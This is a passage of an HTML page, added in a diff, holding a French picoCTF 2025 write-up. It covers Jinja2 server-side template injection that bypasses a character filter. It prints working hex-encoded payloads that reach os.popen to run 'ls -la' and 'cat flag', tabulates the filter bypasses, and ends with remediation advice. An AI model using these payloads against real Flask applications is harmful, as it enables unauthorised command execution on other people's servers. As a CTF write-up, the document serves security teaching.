+      les crochets.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Payload RCE · ls -la</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>{{request
+  |attr('application')
+  |attr('\x5f\x5fglobals\x5f\x5f')
+  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
+  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
+  |attr('popen')('ls -la')
+  |attr('read')()}}</pre>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Segment du payload</th>
+            <th>Équivalent Python</th>
+            <th>Rôle</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>request</code></td>
+            <td><code>request</code></td>
+            <td>Objet requête Flask — disponible dans tout template</td>
+          </tr>
+          <tr>
+            <td><code>|attr('application')</code></td>
+            <td><code>.application</code></td>
+            <td>Accède à l'objet application Flask</td>
+          </tr>
+          <tr>
+            <td><code>|attr('\x5f\x5fglobals\x5f\x5f')</code></td>
+            <td><code>.__globals__</code></td>
+            <td>Dictionnaire des variables globales du module</td>
+          </tr>
+          <tr>
+            <td><code>|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')</code></td>
+            <td><code>['__builtins__']</code></td>
+            <td>Accède aux builtins Python</td>
+          </tr>
+          <tr>
+            <td><code>|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')</code></td>
+            <td><code>__import__('os')</code></td>
+            <td>Importe le module système <code>os</code></td>
+          </tr>
+          <tr>
+            <td><code>|attr('popen')('ls -la')</code></td>
+            <td><code>.popen('ls -la')</code></td>
+            <td>Exécute la commande shell</td>
+          </tr>
+          <tr>
+            <td><code>|attr('read')()</code></td>
+            <td><code>.read()</code></td>
+            <td>Lit et retourne la sortie standard</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">rce_ls.png — Sortie ls -la</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/432b4bde-e910-4669-9189-e94de70b5806" alt="Résultat RCE — listing ls -la" loading="lazy">
+      <div class="terminal-caption">RCE confirmée — liste complète des fichiers. Le fichier <code>flag</code> est visible.</div>
+    </div>
+
+    <div class="result-badge">RCE confirmée — fichier <code>flag</code> localisé dans le répertoire courant</div>
+
+    <h3 class="subsection-title">5.2 — Lecture du flag (<code>cat flag</code>)</h3>
+
+    <p>
+      Il suffit de remplacer la commande <code>ls -la</code> par <code>cat flag</code> pour
+      afficher le contenu du fichier directement dans la réponse HTTP.
+    </p>
+
+    <div class="code-wrap">
+      <div class="code-header">
+        <span class="code-lang">Jinja2 — Payload RCE · cat flag</span>
+        <button class="copy-btn" onclick="copyCode(this)">copier</button>
+      </div>
+      <pre>{{request
+  |attr('application')
+  |attr('\x5f\x5fglobals\x5f\x5f')
+  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
+  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
+  |attr('popen')('cat flag')
+  |attr('read')()}}</pre>
+    </div>
+
+    <div class="terminal-frame">
+      <div class="terminal-bar">
+        <div class="t-dot t-dot-red"></div>
+        <div class="t-dot t-dot-amber"></div>
+        <div class="t-dot t-dot-green"></div>
+        <span class="terminal-bar-label">flag_output.png — Flag capturé</span>
+      </div>
+      <img src="https://github.com/user-attachments/assets/47b86f77-913e-4f70-9ed7-fdbefcc343ef" alt="Flag affiché dans la réponse" loading="lazy">
+      <div class="terminal-caption">Le flag s'affiche directement dans la réponse HTTP — objectif atteint</div>
+    </div>
+  </section>
+
+  <!-- 06 - FLAG -->
+  <section class="section" id="s6">
+    <div class="section-label">Phase <span>06</span></div>
+    <h2 class="section-title">Capture du Flag</h2>
+
+    <div class="flag-box">
+      <div class="flag-label">Flag capturé</div>
+      <div class="flag-text">picoCTF{ · · · }</div>
+    </div>
+
+    <p style="text-align:center; color: var(--muted); font-size:.85rem;">
+      Le flag réel diffère selon l'instance — celui-ci est masqué dans ce write-up public.
+    </p>
+
+    <h3 class="subsection-title">Récapitulatif des techniques</h3>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Filtre WAF</th>
+            <th>Technique de bypass</th>
+            <th>Syntaxe Jinja2</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>.</code> — point</td>
+            <td>Filtre natif <code>attr()</code></td>
+            <td><code>|attr('nom')</code></td>
+          </tr>
+          <tr>
+            <td><code>_</code> — underscore</td>
+            <td>Hex encoding Python</td>
+            <td><code>'\x5f\x5fglobals\x5f\x5f'</code></td>
+          </tr>
+          <tr>
+            <td><code>[ ]</code> — crochets</td>
+            <td>Méthode magique <code>__getitem__</code></td>
+            <td><code>|attr('\x5f\x5fgetitem\x5f\x5f')('clé')</code></td>
+          </tr>
+          <tr>
+            <td><code>' "</code> — guillemets</td>
+            <td>Hex dans les chaînes</td>
+            <td><code>'\x5f\x5f'</code></td>
+          </tr>
+          <tr>
+            <td>Accès aux modules</td>
+            <td>Chaîne <code>request → os.popen</code></td>
+            <td>Via <code>application.__globals__.__builtins__</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 07 - SÉCURITÉ -->
+  <section class="section" id="s7">
+    <div class="section-label">Phase <span>07</span></div>
+    <h2 class="section-title">Recommandations de Sécurité</h2>
+
+    <p>
+      Ce challenge illustre pourquoi la sécurité des applications Flask doit être pensée en profondeur,
+      et non résumée à une liste noire de caractères. Voici les mesures correctives essentielles.
+    </p>
+
+    <ul class="rec-list">
+      <li>
+        <span class="rec-num">01</span>
+        <div>
+          <strong>Ne jamais injecter l'entrée utilisateur dans le template lui-même.</strong>
+          Passer les données comme variables au template via <code>render_template('page.html', user_input=value)</code>,
+          jamais via <code>render_template_string(user_input)</code>.
+        </div>
+      </li>
+      <li>
+        <span class="rec-num">02</span>
+        <div>
+          <strong>Activer le sandboxing Jinja2.</strong>
+          La classe <code>SandboxedEnvironment</code> de Jinja2 restreint l'accès aux attributs
+          dangereux comme <code>__globals__</code> et <code>__builtins__</code>.
+        </div>
+      </li>
+      <li>
+        <span class="rec-num">03</span>
+        <div>
+          <strong>Ne pas se fier à une blacklist de caractères.</strong>
+          Ce challenge le démontre : bloquer <code>_</code> ne suffit pas si l'encodage
+          hexadécimal <code>\x5f</code> n'est pas également filtré — et ainsi de suite récursivement.
+        </div>
+      </li>
+      <li>
+        <span class="rec-num">04</span>
+        <div>
+          <strong>Appliquer le principe du moindre privilège.</strong>
+          L'application web ne devrait pas tourner avec les permissions d'un compte capable de
+          lire des fichiers système sensibles. Isoler le processus dans un conteneur ou via <code>seccomp</code>.
+        </div>
+      </li>
+      <li>
+        <span class="rec-num">05</span>
+        <div>
+          <strong>Déployer un WAF avec détection comportementale.</strong>
+          Une détection basée sur les patterns SSTI connus (arbres d'expression, chaînes d'attributs)
+          est plus robuste qu'un simple filtrage de caractères individuels.
+        </div>
+      </li>
+    </ul>
+
+    <h3 class="subsection-title">Références</h3>
+
+    <div class="ref-grid">
+      <a class="ref-card" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md" target="_blank" rel="noopener">
+        <div class="ref-icon">📦</div>
+        <div class="ref-name">PayloadsAllTheThings</div>
+        <div class="ref-url">SSTI — Jinja2 / Python payloads</div>
+      </a>
+      <a class="ref-card" href="https://jinja.palletsprojects.com/en/3.1.x/sandbox/" target="_blank" rel="noopener">
+        <div class="ref-icon">📄</div>
+        <div class="ref-name">Jinja2 — SandboxedEnvironment</div>
+        <div class="ref-url">Documentation officielle Jinja2</div>
+      </a>
+      <a class="ref-card" href="https://owasp.org/www-community/attacks/Server_Side_Template_Injection" target="_blank" rel="noopener">
+        <div class="ref-icon">🛡️</div>
+        <div class="ref-name">OWASP — SSTI</div>
+        <div class="ref-url">Server-Side Template Injection</div>
+      </a>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-author">
+      Rédigé par <a href="https://github.com/exploit4040" target="_blank" rel="noopener">Yahaya Meddy</a>
+      &nbsp;·&nbsp; picoCTF 2025 &nbsp;·&nbsp; Web Exploitation
+    </div>
+    <div class="footer-badge">
+      <span>picoCTF</span> 2025 · organisé par Venax
+    </div>
+  </footer>
+
+</div><!-- .inner -->
+</main>
+
+<script>
+  // Copy button
+  function copyCode(btn) {
+    const pre = btn.closest('.code-wrap').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'copié ✓';
+      btn.style.borderColor = 'var(--cyan)';
+      btn.style.color = 'var(--cyan)';
+      setTimeout(() => {
+        btn.textContent = 'copier';
+        btn.style.borderColor = '';
+        btn.style.color = '';
+      }, 1800);
+    });
+  }
+
+  // Active sidebar dot on scroll
+  const sections = document.querySelectorAll('.section[id]');
+  const dots = document.querySelectorAll('.phase-dot');
+
+  function updateActive() {
+    let current = '';
+    sections.forEach(sec => {
+      if (window.scrollY + 200 >= sec.offsetTop) current = sec.id;
+    });
+    dots.forEach(dot => {
+      dot.classList.toggle('active', dot.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateActive, { passive: true });
+  updateActive();
+</script>
+</body>
+</html>
